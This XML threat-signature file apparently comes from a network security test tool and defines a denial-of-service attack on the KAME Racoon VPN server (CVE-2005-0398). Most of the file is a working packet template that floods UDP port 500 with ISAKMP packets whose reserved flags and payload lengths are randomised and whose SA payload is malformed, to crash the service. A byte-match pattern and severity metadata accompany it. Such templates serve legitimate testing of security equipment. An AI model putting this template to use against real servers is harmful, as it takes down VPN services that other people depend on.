<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Racoon Denial Of Service Attack"/>
    <EngDesc display="true" value="This threat sends flood of ISAKMP packets at the Racoon VPN server.  It uses random elements in the reserved flag fields, causing a crash.  KAME listens typically listens on UDP port 500."/>
    <Intent display="true">
      <item value="Crashing"/>
      <item value="Denial_of_Service"/>
      <item value="Flood"/>
    </Intent>
    <Protocol display="true" value="ISAKMP"/>
    <Type_Of_Equipment display="true">
      <item value="Server"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="KAME"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Racoon"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true"/>
    <Credit display="true" value="http://www.kame.net/dev/query-pr.cgi?pr=555"/>
    <CVEID display="true" value="CVE-2005-0398"/>
    <bugtraqID display="true" value="12804"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="00000102dd73566800c000a80001003c6b2551f9"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="false"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="none"/>
    <IntegImpact display="false" value="none"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632742200888906250"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="A"/>
    <SigProtocol display="false" value="ISAKMP_SAPayload"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value="\X20\X1A\X1B\X1C\X1D\X1E\X1F\X20\X21\X22\X23\X24\X25\X26\X27\X28\X29\X2A\X2B\X2C\X2D\X2E\X2F\X30\X31\X32\X33\X34\X35\X36\X37\X38\X20\X78\X33\X39\X3A\X3B\X3C\X3D\X3E\X3F\X40\X41\X42\X43\X44\X45\X46\X47\X48\X49\X4A\X4B\X4C\X4D\X4E\X4F\X50\X51\X52\X53\X54\X55\X56\X57\X00\X20\X35\X38\X59\X5A\X5B\X5C\X5D\X5E\X5F\X60\X61\X62\X63\X64\X65\X66\X67\X68\X69\X6A\X6B\X6C\X6D\X6E\X6F\X70\X71\X72\X73\X74\X75\X76\X07\X20\X37\X78\X79\X7A\X7B\X7C\X7D\X7E\X7F\XC2\X80\XC2\X81\XC2\X82\XC2\X83\XC2\XA4\X00\X00\X56\X00\X01\X02\X03\X04\X05\X06\X07\X08\X09\X0A\X0B\X0C\X0D\X0E\X20\X0F\X10\X11\X12\X13\X14\X15\X16\X17\X18\X19\X1A\X1B\X1C\X1D\X1E\X1F\X20\X21\X22\X23\X24\X25\X26\X27\X28\X29\X2A\X2B\X2C\X2D\X20\X78\X32\X45\X2F\X30\X31\X32\X33\X34\X35\X36\X37\X38\X39\X3A\X3B\X3C\X3D\X3E\X3F\X40\X41\X42\X43\X44\X45\X46\X47\X48\X49\X4A\X4B\X4C\X00\X20\X34\X44\X4E\X4F\X50\X51\X52\X52\X52\X52\X4E\X4F\X50\X51\X52\X3C\X3D\X3E\X3F\X40\X41\X42\X43\X44\X45\X46\X47\X48\X49\X4A\X4B\X4C\X00\X20\X34\X44\X4E\X4F\X50\X51\X52\X52"/>
    <Created value="1139462421" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
    <NamedVar name="ISAKMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
      <for index="F"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0, FFFF)" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <UDP srcPort="@random(1026, 65535)" destPort="$ISAKMPdestPort" checksum="" length="">
          <ISAKMP_Header InitiatorCookie="AAAAAAAAAAAAAAAA" ResponderCookie="0000000000000000" NextPayload="@random(0,FF)" MajorVersion="1" MinorVersion="0" ExchangeType="04" Flags="00" MessageID="00000000" Length="0000017b">
            <ISAKMP_GenericPayloadHeader NextPayload="" Reserved="@random(0,FF)" PayloadLength="@random(0,FFFF)">
              <ISAKMP_SAPayload DOI="3500c280" Situation="010000000100000074010100010300002401010000C280010005C28020020002C280040002C28003C3BDC3A9C2800B0001000C00040020C384C29B030000240201000020783830010005C280020002C280040002C28003C3BDC3A9C2800B0001000C00040020C384C29B0000000020323403010000C280010005C280020002C280040002C28003C3BDC3A9C2800B0001000C000400200C2034C29B0A0000C288000102030405060708090A0B0C0D0E0F10111213141516171819" Payload="201A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738207833393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565700203538595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F7071727374757607203778797A7B7C7D7E7FC280C281C282C283C2A4000056000102030405060708090A0B0C0D0E200F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D207832452F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C002034444E4F5051525252524E4F5051523C3D3E3F404142434445464748494A4B4C002034444E4F50515252"/>
            </ISAKMP_GenericPayloadHeader>
          </ISAKMP_Header>
        </UDP>
      </IP>
    </Ethernet>
  </Output>
</threatSignature>
